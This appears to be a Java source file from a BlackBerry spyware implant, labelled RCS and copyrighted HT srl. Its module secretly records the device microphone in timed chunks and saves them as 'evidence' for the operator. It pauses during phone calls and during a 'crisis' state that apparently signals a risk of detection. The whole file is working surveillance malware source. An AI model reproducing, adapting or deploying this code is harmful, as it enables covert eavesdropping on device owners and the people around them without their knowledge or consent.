//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MicAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.device.api.util.DataBuffer;
import blackberry.Messages;
import blackberry.Status;
import blackberry.config.ConfModule;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.fs.Path;
import blackberry.manager.ModuleManager;
import blackberry.record.AudioRecorder;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;

/**
 * The Class MicAgent.
 */
public final class ModuleMic extends BaseModule implements PhoneListener {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModMic", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final long MIC_PERIOD = 5000;

    private final int STOPPED = 0;
    private final int STARTED = 1;
    private final int SUSPENDED = 2;

    static final int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5,
            5, 0, 0, 0, 0 };

    //AudioRecorderDispatcher recorder;
    long fId;

    //boolean suspended = false;
    int state;
    Object stateLock = new Object();

    private AudioRecorder recorder;
    int numFailures;

    public static String getStaticType() {
        return Messages.getString("15.0"); //$NON-NLS-1$
    }

    public static ModuleMic getInstance() {
        return (ModuleMic) ModuleManager.getInstance().get(getStaticType());
    }

    public boolean parse(ConfModule conf) {
        setPeriod(MIC_PERIOD);
        setDelay(MIC_PERIOD);
        state = STOPPED;
        return true;
    }

    public void actualStart() {
        //#ifdef DEBUG
        debug.info("start"); //$NON-NLS-1$
        //#endif

        synchronized (stateLock) {
            if (state != STARTED) {
                Phone.addPhoneListener(this);

                //#ifdef DBC
                Check.ensures(state != STARTED, "state == STARTED"); //$NON-NLS-1$
                //#endif			
                startRecorder();

                //#ifdef DEBUG
                debug.trace("started"); //$NON-NLS-1$
                //#endif

            }

            state = STARTED;
        }

    }

    public void actualStop() {
        //#ifdef DEBUG
        debug.info("stop"); //$NON-NLS-1$
        //#endif

        synchronized (stateLock) {
            if (state == STARTED) {
                Phone.removePhoneListener(this);

                //#ifdef DBC
                Check.ensures(state != STOPPED, "state == STOPPED"); //$NON-NLS-1$
                //#endif
                saveRecorderEvidence();
                stopRecorder();
            }
            state = STOPPED;

        }
        //#ifdef DEBUG
        debug.trace("stopped"); //$NON-NLS-1$
        //#endif

    }

    private void newState(int newstate) {
        synchronized (stateLock) {
            state = newstate;
        }
    }

    public void crisis(boolean value) {
        if (value) {
            //#ifdef DEBUG
            debug.warn("Crisis!"); //$NON-NLS-1$
            //#endif
            suspend();
        } else {
            //#ifdef DEBUG
            debug.warn("End of Crisis!"); //$NON-NLS-1$
            //#endif
            resume();
        }
    }

    synchronized void startRecorder() {
        //#ifdef DEBUG
        debug.trace("startRecorder"); //$NON-NLS-1$
        //#endif

        final DateTime dateTime = new DateTime();
        fId = dateTime.getFiledate();

        recorder = new AudioRecorder();
        recorder.start();

        //#ifdef DEBUG
        debug.trace("Started: " + (recorder != null)); //$NON-NLS-1$
        //#endif

        if (Status.self().wantLight()) {
            Debug.ledStart(Debug.COLOR_BLUE_LIGHT);
        }

        numFailures = 0;
    }

    synchronized void stopRecorder() {
        //#ifdef DEBUG
        debug.trace("stopRecorder"); //$NON-NLS-1$
        //#endif

        if (recorder == null) {
            //#ifdef DEBUG
            debug.error("Null recorder"); //$NON-NLS-1$
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.info("STOP"); //$NON-NLS-1$
        //#endif

        recorder.stop();
        if (Status.self().wantLight()) {
            Debug.ledStop();
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualLoop() {
        //#ifdef DBC
        Check.requires(recorder != null, "actualRun: recorder == null"); //$NON-NLS-1$
        //#endif

        synchronized (stateLock) {
            if (state == STARTED) {

                if (numFailures < 10) {
                    saveRecorderEvidence();
                } else {
                    //#ifdef DEBUG
                    debug.warn("numFailures: " + numFailures); //$NON-NLS-1$
                    //#endif

                    suspend();
                }

                if (status.callInAction()) {
                    //#ifdef DEBUG
                    debug.warn("phone call in progress, suspend!"); //$NON-NLS-1$
                    //#endif                   
                    suspend();

                } else if (Status.getInstance().crisisMic()) {
                    //#ifdef DEBUG
                    debug.warn("crisis, suspend!"); //$NON-NLS-1$
                    //#endif                   
                    suspend();
                }
            }
        }
    }

    private void saveRecorderEvidence() {
        //#ifdef DBC
        Check.requires(recorder != null, "saveRecorderEvidence recorder==null"); //$NON-NLS-1$
        //#endif

        final byte[] chunk = recorder.getAvailable();

        if (chunk != null && chunk.length > 0) {

            Evidence evidence = new Evidence(EvidenceType.MIC);
            //#ifdef DBC
            Check.requires(evidence != null, "Null log"); //$NON-NLS-1$
            //#endif

            int offset = 0;
            if (Utils.equals(chunk, 0, AudioRecorder.AMR_HEADER, 0,
                    AudioRecorder.AMR_HEADER.length)) {
                offset = AudioRecorder.AMR_HEADER.length;
            }

            //#ifdef DEBUG
            if (offset != 0) {
                debug.trace("offset: " + offset); //$NON-NLS-1$
            } else {
            }
            //#endif

            evidence.createEvidence(getAdditionalData());
            //#ifdef DEBUG
            debug.trace("saveRecorderEvidence, chunk size: " + chunk.length); //$NON-NLS-1$
            //#endif
            evidence.writeEvidence(chunk, offset);
            evidence.close();
            
            if (Status.self().wantLight()) {
                Debug.ledStart(Debug.COLOR_BLUE_LIGHT);
            }
        } else {
            //#ifdef DEBUG
            debug.warn("zero chunk "); //$NON-NLS-1$
            //#endif
            numFailures += 1;
        }
    }

    private byte[] getAdditionalData() {
        final int LOG_MIC_VERSION = 2008121901;
        // LOG_AUDIO_CODEC_SPEEX   0x00;
        final int LOG_AUDIO_CODEC_AMR = 0x01;
        final int sampleRate = 8000;

        final int tlen = 16;
        final byte[] additionalData = new byte[tlen];

        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
                false);

        databuffer.writeInt(LOG_MIC_VERSION);
        databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
        databuffer.writeLong(fId);

        //#ifdef DBC
        Check.ensures(additionalData.length == tlen,
                "Wrong additional data name"); //$NON-NLS-1$
        //#endif
        return additionalData;
    }

    /**
     * Suspend recording
     */
    private void suspend() {
        synchronized (stateLock) {
            if (state == STARTED) {
                //#ifdef DEBUG
                debug.info("Call: suspending recording"); //$NON-NLS-1$
                //#endif
                stopRecorder();
                state = SUSPENDED;
            } else {
                //#ifdef DEBUG
                debug.trace("suspend: already done"); //$NON-NLS-1$
                //#endif
            }
        }
    }

    private void resume() {
        synchronized (stateLock) {
            if (state == SUSPENDED && !Status.getInstance().callInAction()
                    && !Status.getInstance().crisisMic()) {
                //#ifdef DEBUG
                debug.info("Call: resuming recording"); //$NON-NLS-1$
                //#endif
                startRecorder();
                state = STARTED;
            } else {
                //#ifdef DEBUG
                debug.trace("resume: already done"); //$NON-NLS-1$
                //#endif
            }
        }
    }

    public void callIncoming(int callId) {
        init();

        //#ifdef DEBUG
        debug.trace("callIncoming"); //$NON-NLS-1$
        //#endif

        final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
        agent.suspend();
    }

    public void callInitiated(int callid) {
        init();

        //#ifdef DEBUG
        debug.trace("callInitiated"); //$NON-NLS-1$
        //#endif
        final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
        agent.suspend();
    }

    public void callDisconnected(int callId) {
        init();

        //#ifdef DEBUG
        debug.trace("callDisconnected"); //$NON-NLS-1$
        //#endif
        final ModuleMic agent = (ModuleMic) ModuleMic.getInstance();
        agent.resume();
    }

    public void callAdded(int callId) {

    }

    public void callAnswered(int callId) {

    }

    public void callConferenceCallEstablished(int callId) {

    }

    public void callConnected(int callId) {

    }

    public void callDirectConnectConnected(int callId) {

    }

    public void callDirectConnectDisconnected(int callId) {

    }

    public void callEndedByUser(int callId) {

    }

    public void callFailed(int callId, int reason) {

    }

    public void callHeld(int callId) {

    }

    public void callRemoved(int callId) {

    }

    public void callResumed(int callId) {

    }

    public void callWaiting(int callid) {

    }

    public void conferenceCallDisconnected(int callId) {

    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }
}
